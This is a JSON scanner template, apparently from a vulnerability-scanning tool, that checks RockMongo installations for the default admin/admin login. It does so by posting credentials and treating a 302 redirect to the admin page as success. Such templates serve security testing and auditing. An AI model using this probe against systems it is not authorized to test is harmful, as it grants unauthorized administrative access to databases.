{
    "Name": "rockmongo-default-password",
    "Description": "rockmongo-default-password",
    "Product": "rockmongo",
    "author": "chumeng",
    "Request":[
                {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/index.php?action=login.index&host=0",
        "Port":"",
        "Data":"more=0&host=0&username=admin&password=admin&db=&lang=zh_cn&expire=3",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
            { "Operation": "contains",
                "Key":"location",
                "Value": "/index.php?action=admin.index&host=0"
            },
            {
                "Operation": "code",
                "Key":"",
                "Value": "302"
            }

        ]
        },
        "Next_decide":""
                }
]}

